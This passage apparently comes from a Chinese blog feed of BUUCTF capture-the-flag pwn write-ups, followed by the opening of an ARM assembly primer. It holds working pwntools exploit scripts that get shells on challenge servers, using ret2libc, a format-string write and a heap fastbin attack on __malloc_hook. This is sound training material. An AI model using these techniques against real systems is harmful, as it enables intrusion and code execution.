class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26419</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc32&#x27;)</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x8c</span>) + p32(elf.symbols[<span class="string">&#x27;write&#x27;</span>]) + p32(elf.symbols[<span class="string">&#x27;vulnerable_function&#x27;</span>])</span><br><span class="line">payload += p32(<span class="number">1</span>) + p32(elf.got[<span class="string">&#x27;read&#x27;</span>]) + p32(<span class="number">24</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv(<span class="number">16</span>)</span><br><span class="line">write = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write)</span><br><span class="line">base = write - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">sys = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># base = write - libc.symbols[&#x27;write&#x27;]</span></span><br><span class="line"><span class="comment"># sys = base + libc.symbols[&#x27;system&#x27;]</span></span><br><span class="line"><span class="comment"># binsh = base + next(libc.search(b&#x27;/bin/sh&#x27;))</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(sys))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x8c</span>) + p32(sys) + p32(binsh) + p32(binsh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu022-bjdctf-2020-babyrop"><a href="#buu022-bjdctf-2020-babyrop" class="headerlink" title="buu022-bjdctf_2020_babyrop"></a>buu022-bjdctf_2020_babyrop</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27132</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">poprdi_ret = <span class="number">0x400733</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x20</span> + <span class="number">8</span>) + p64(poprdi_ret) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.symbols[<span class="string">&#x27;vuln&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;tell me u story!\n&#x27;</span>, payload)</span><br><span class="line">puts = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts)</span><br><span class="line">base = puts - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(sys))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x20</span> + <span class="number">8</span>) + p64(poprdi_ret) + p64(binsh)</span><br><span class="line">payload += p64(sys)</span><br><span class="line">payload += p64(elf.symbols[<span class="string">&#x27;vuln&#x27;</span>])</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;tell me u story!\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu023-bjdctf-2020-babystack2"><a href="#buu023-bjdctf-2020-babystack2" class="headerlink" title="buu023-bjdctf_2020_babystack2"></a>buu023-bjdctf_2020_babystack2</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25497</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;[+]Please input the length of your name:&#x27;</span>, <span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;[+]What\&#x27;s u name?&#x27;</span>, cyclic(<span class="number">16</span>+<span class="number">8</span>) + p64(elf.symbols[<span class="string">&#x27;backdoor&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu024-jarvisoj-fm"><a href="#buu024-jarvisoj-fm" class="headerlink" title="buu024-jarvisoj_fm"></a>buu024-jarvisoj_fm</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29021</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(fmtstr_payload(<span class="number">11</span>, &#123;<span class="number">0x804A02C</span>: <span class="number">4</span>&#125;))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu025-pwn2-sctf-2016"><a href="#buu025-pwn2-sctf-2016" class="headerlink" title="buu025-pwn2_sctf_2016"></a>buu025-pwn2_sctf_2016</h1><p>这一题真是吃尽苦头，LibcSearcher不给力，找半天也没找到适合的libc（应该是libc6-i386_2.23_0ubuntu10_amd64，但是由于LibcSearcher连的是ubuntu官网，这个版本被删了，然后就找不到了。。。）。看着这道题没做出来实在是气，不过又看到了程序中有一个int 80，于是思考能不能用系统调用解决问题。发现很难，因为给的gadget都是inc，执行完vuln函数之后eax,ebx,edx都是很小的值，总不可能一个inc执行几十万次吧？<br>查看了下gadget，ebx,edi,esi,ebp倒是能直接控制，对于eax,ecx,edx还是要费很多心思。<br>后来给用pip装的LibcSearcher卸了换上<a href="https://github.com/lieanu/LibcSearcher">国人写的</a>就好了。果然还是国人给力o(￣▽￣)ｄ<br>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29855</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_anyaddr</span>(<span class="params">addr</span>):</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;want me to read? &#x27;</span>, <span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;bytes of data!&#x27;</span>, cyclic(<span class="number">0x2C</span> + <span class="number">4</span>) + p32(elf.plt[<span class="string">&#x27;printf&#x27;</span>]) + p32(elf.symbols[<span class="string">&#x27;vuln&#x27;</span>]) + p32(addr))</span><br><span class="line">content = io.recvuntil(<span class="string">b&#x27;How&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">len</span>(content)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;How many bytes do you want me to read? &#x27;</span>, <span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;bytes of data!&#x27;</span>, cyclic(<span class="number">0x2C</span> + <span class="number">4</span>) + p32(elf.plt[<span class="string">&#x27;printf&#x27;</span>]) + p32(elf.symbols[<span class="string">&#x27;vuln&#x27;</span>]) + p32(elf.got[<span class="string">&#x27;printf&#x27;</span>]))</span><br><span class="line">io.recvuntil(p32(elf.got[<span class="string">&#x27;printf&#x27;</span>]) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io.recv(4)</span></span><br><span class="line">printf = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;printf&#x27;</span>, printf)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(printf))</span><br><span class="line">base = printf - libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">sys = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(sys))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;bytes of data!&#x27;</span>, cyclic(<span class="number">0x2C</span> + <span class="number">4</span>) + p32(sys) + p32(binsh) + p32(binsh))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu026-babyheap-0ctf-2017"><a href="#buu026-babyheap-0ctf-2017" class="headerlink" title="buu026-babyheap_0ctf_2017"></a>buu026-babyheap_0ctf_2017</h1><p>第一道堆题。<br><strong>解法：unsorted bin overlapping chunks + fastbin attack</strong><br>提供了分配chunk、填充chunk、释放chunk、打印chunk内容4个功能。其中填充chunk功能没有进行边界检查，可以产生堆溢出：<br><img src="https://img-blog.csdnimg.cn/819fff57a2e84971a375beb1be6ffc31.png"><br>简单看了一下，试了几下之后，发现这道题和前面所有题都截然不同，难度完全不是一个档次。<br>首先，这道题中<strong>对于内存的分配使用的是calloc而非malloc函数</strong>，这使得我们要想获得libc的加载地址必须首先进行堆块重叠后释放内部堆块，这样才能够通过读取外部堆块获取关键地址。另外，<strong>本题的堆块大小保存在一个单独的数组之中，可读取的大小也在这里保存，因此直接在堆中修改chunk的size并不能增加我们读取的长度</strong>。要想实现堆块的重叠就必须首先释放堆块，通过堆溢出修改堆块的size后分配回来。但这样的话，由于calloc的特性，堆块中的所有内容都将被抹除，也就无法获取到地址的值。因此，要保留地址的值，我们不能将这个堆块全部分配回来。要知道，虽然内部重叠堆块的prev_size和size等信息虽然被清零，但仍然能够读取后面的内容，所以我们选择将修改过大小的堆块部分分配回来，留下一个last_remainder堆块保留在原先的内部堆块的内部。这样就可以通过访问内部堆块获取到地址的值了。<br><img src="https://img-blog.csdnimg.cn/0481579d7899474cbe33733f3aa828e4.png"></p><p>获取到了这里的地址，我们就可以获取到system函数和__free_hook的地址。本题环境为2.23，无tcache的影响，有通过fastbin attack修改__malloc_hook的可行性。</p><p>这是一开始__malloc_hook附近的情况：<br><img src="https://img-blog.csdnimg.cn/b90efebb8ce54bd7ae8349c3569acd6f.png"><br>要想在__malloc_hook附近分配chunk，首先需要通过检查：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">  errout:</span><br><span class="line">    malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>下面是fastbin_index的宏定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> fastbin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span></span><br></pre></td></tr></table></figure><p>我们可以通过地址错位达到目的：</p><table><thead><tr><th align="center">address</th><th align="center">+0</th><th align="center">+1</th><th align="center">+2</th><th align="center">+3</th><th align="center">+4</th><th align="center">+5</th><th align="center">+6</th><th align="center">+7</th></tr></thead><tbody><tr><td align="center">0x7fc36e4ddaf0</td><td align="center">60</td><td align="center">c2</td><td align="center">4d</td><td align="center">6e</td><td align="center">c3</td><td align="center"><font color=red>7f</font></td><td align="center"><font color=red>00</font></td><td align="center"><font color=red>00</font></td></tr><tr><td align="center">0x7fc36e4ddaf8</td><td align="center"><font color=red>00</font></td><td align="center"><font color=red>00</font></td><td align="center"><font color=red>00</font></td><td align="center"><font color=red>00</font></td><td align="center"><font color=red>00</font></td><td align="center">00</td><td align="center">00</td><td align="center">00</td></tr><tr><td align="center">0x7fc36e4ddb00</td><td align="center">a0</td><td align="center">ee</td><td align="center">19</td><td align="center">6e</td><td align="center">c3</td><td align="center">7f</td><td align="center">00</td><td align="center">00</td></tr></tbody></table><p>红色部分刚好能通过这个检查，需要使fd变为__malloc_hook-0x23才行，其对应的fastbin应该是存放0x70大小chunk的fastbin，因此我们要事先分配好0x70大小的chunk然后释放它，修改fd指针后再申请回来即可。<br>拿到__malloc_hook处的chunk后向__malloc_hook写入one_gadget即可，尝试了4个只有一个能成功，而且最后一次分配chunk还必须在interactive之后手动分配，自动分配打远程会卡住……</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># io = remote(&#x27;node4.buuoj.cn&#x27;, 29330)</span></span><br><span class="line"></span><br><span class="line">in_use = [<span class="literal">False</span>] * <span class="number">0x10</span><span class="comment"># in_use array</span></span><br><span class="line">one_gadgets = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allocate</span>(<span class="params">size</span>):</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Command: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Allocate Index &#x27;</span>)</span><br><span class="line">allocated_index = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">10</span>)</span><br><span class="line">in_use[allocated_index] = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">index, size, content</span>):</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Command: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">io.sendafter(<span class="string">b&#x27;Content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">release</span>(<span class="params">index</span>):</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Command: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">in_use[index] = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index</span>):</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Command: &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Content: \n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x110</span>)<span class="comment"># chunk #0</span></span><br><span class="line">allocate(<span class="number">0x110</span>)<span class="comment"># chunk #1</span></span><br><span class="line">allocate(<span class="number">0x110</span>)<span class="comment"># chunk #2</span></span><br><span class="line">allocate(<span class="number">0x110</span>)<span class="comment"># chunk #3</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x110</span>)</span><br><span class="line">payload += p64(<span class="number">0x120</span>)<span class="comment"># prev_size of chunk #1</span></span><br><span class="line">payload += p64(<span class="number">0x241</span>)<span class="comment"># fake size of chunk #1</span></span><br><span class="line">fill(<span class="number">0</span>, <span class="number">0x120</span>, payload)</span><br><span class="line"></span><br><span class="line">release(<span class="number">1</span>)</span><br><span class="line">allocate(<span class="number">0x130</span>)<span class="comment"># fake chunk #1</span></span><br><span class="line"></span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">io.recv(<span class="number">0x20</span>)</span><br><span class="line">malloc_hook = u64(io.recv(<span class="number">8</span>)) - <span class="number">88</span> - <span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__malloc_hook&#x27;</span>, malloc_hook)</span><br><span class="line">base = malloc_hook - libc.dump(<span class="string">&#x27;__malloc_hook&#x27;</span>)</span><br><span class="line">free_hook = base + libc.dump(<span class="string">&#x27;__free_hook&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">2</span>, <span class="number">0x30</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x18</span> + p64(<span class="number">0x100</span>) + p64(malloc_hook + <span class="number">0x10</span> + <span class="number">88</span>) + p64(malloc_hook + <span class="number">0x10</span> + <span class="number">88</span>))</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0xf0</span>)<span class="comment"># chunk #4</span></span><br><span class="line">allocate(<span class="number">0x20</span>)<span class="comment"># chunk #5</span></span><br><span class="line">allocate(<span class="number">0x60</span>)<span class="comment"># chunk #6</span></span><br><span class="line"></span><br><span class="line">release(<span class="number">6</span>)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">fill(<span class="number">5</span>, <span class="number">0x38</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x20</span> + p64(<span class="number">0x30</span>) + p64(<span class="number">0x71</span>) + p64(malloc_hook - <span class="number">0x23</span>))<span class="comment"># fastbin attack</span></span><br><span class="line">allocate(<span class="number">0x60</span>)<span class="comment"># chunk #6</span></span><br><span class="line">allocate(<span class="number">0x60</span>)<span class="comment"># chunk #7, this one is on __malloc_hook</span></span><br><span class="line"></span><br><span class="line">fill(<span class="number">7</span>, <span class="number">0x1B</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x13</span> + p64(one_gadgets[<span class="number">1</span>] + base))<span class="comment"># write one_gadget</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># release(6)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># allocate(0x20)### DO THIS IN INTERACTIVE()!!!</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ARM pwn 入门 (1)</title>
      <link href="/2023/02/28/ARM-pwn-%E5%85%A5%E9%97%A8-1/"/>
      <url>/2023/02/28/ARM-pwn-%E5%85%A5%E9%97%A8-1/</url>
      
        <content type="html"><![CDATA[<p>最近笔者刚刚加入了一个项目组，需要用到ARM架构的东西，和ARM pwn也有一定关系，因此一不做二不休，决定开始学习ARM pwn，顺便熟悉项目前置知识，一举两得。</p><p>ARM与x86分属不同架构，指令集不同，需要从头开始学习，本文从寄存器、指令方面对x86-64和ARM架构下的汇编语言做比较与学习。（配图选自清华大学出版社《ARM Cortex-M3与Cortex-M4权威指南》，侵删）</p><h2 id="1-寄存器"><a href="#1-寄存器" class="headerlink" title="1. 寄存器"></a>1. 寄存器</h2><p>寄存器是汇编语言的核心，在x86-64系统中，最为常见的寄存器有以下这些：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">64位：</span><br><span class="line">rax, rbx, rcx, rdx</span><br><span class="line">rsi, rdi, rsp, rbp, rip</span><br><span class="line">r8, r9, r10, r11, r12, r13, r14, r15</span><br><span class="line">32位：</span><br><span class="line">eax, ebx, ecx, edx</span><br><span class="line">esi, edi, esp, ebp, eip</span><br><span class="line">r8d, r9d, r10d, r11d, r12d, r13d, r14d, r15d</span><br></pre></td></tr></table></figure><p>在大多数程序中，这17个寄存器是最为常用的寄存器，其中<code>rax, rbx, rcx, rdx, rsi, rdi, rsp, rbp, rip</code>有专门的作用，但其中的<code>rax, rbx, rcx, rdx, rsi, rdi</code>功能相对更加灵活，不像<code>rsp</code>只能用于表示栈顶地址，<code>rbp</code>只能用于表示栈帧地址，<code>rip</code>只能用于表示当前指令地址等。另外的8个寄存器则是通用寄存器，想用来干嘛就干嘛。</p><p>那么在ARM架构中，寄存器则是以下这些：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">64位：</span><br><span class="line">X0, X1, X2, X3, X4, X5, X6, X7, X8, X9, X10, X11, X12</span><br><span class="line">X13, X14, X15</span><br><span class="line">32位：</span><br><span class="line">R0, R1, R2, R3, R4, R5, R6, R7, R8, R9, R10, R11, R12</span><br><span class="line">R13, R14, R15</span><br></pre></td></tr></table></figure><p>其中<code>R0~R12</code>为通用寄存器，共13个，剩下的3个有特殊用途：</p><ul><li><code>R13</code>为栈指针，又称<code>SP</code>，相当于<code>rsp</code>，在物理上实际上有两个栈指针：主栈指针和进程栈指针，一般的进程只有一个栈指针可见。这个也好理解，就好比在x86-64系统中，内核的栈指针和用户进程的栈指针不同一样。</li><li><code>R14</code>为链接寄存器，又称<code>LR</code>，用于保存函数调用时的返回值。在x86-64系统中，函数调用的返回值是保存在子函数栈帧的上面，即<code>rbp+8</code>的位置，在ARM系统中，函数调用同样需要将返回地址保存到栈中，因为<code>LR</code>在函数返回时会进行自动更新，如果栈中没有返回地址，那么<code>LR</code>就不知道要更新成什么值了。当然<code>LR</code>的作用不止这些，在后面遇到具体问题时再进行分析。</li><li><code>R15</code>为程序计数器，又称<code>PC</code>，可读可写。读操作返回当前指令地址+4（由ARM指令集特性决定，ARM指令集中任何一条指令都是偶数长度，与x86-64不同），写操作会导致执行流跳转。<code>PC</code>的最低有效位（LSB）是一个控制结构，为1时表示进入Thumb状态。当有些时候程序跳转更新PC时需要将新PC值的LSB置1，否则会触发错误异常。这也可以看做是一种程序恶意跳转的保护机制。有时还会将<code>PC</code>作为基址访问数据。</li></ul><p>除了这些寄存器之外，两个架构下都各自有各自的特殊寄存器，如x86-64架构下的<code>rflags</code>控制寄存器用于保存程序执行的状态。在ARM中同样具有类似功能的控制寄存器：<br><img 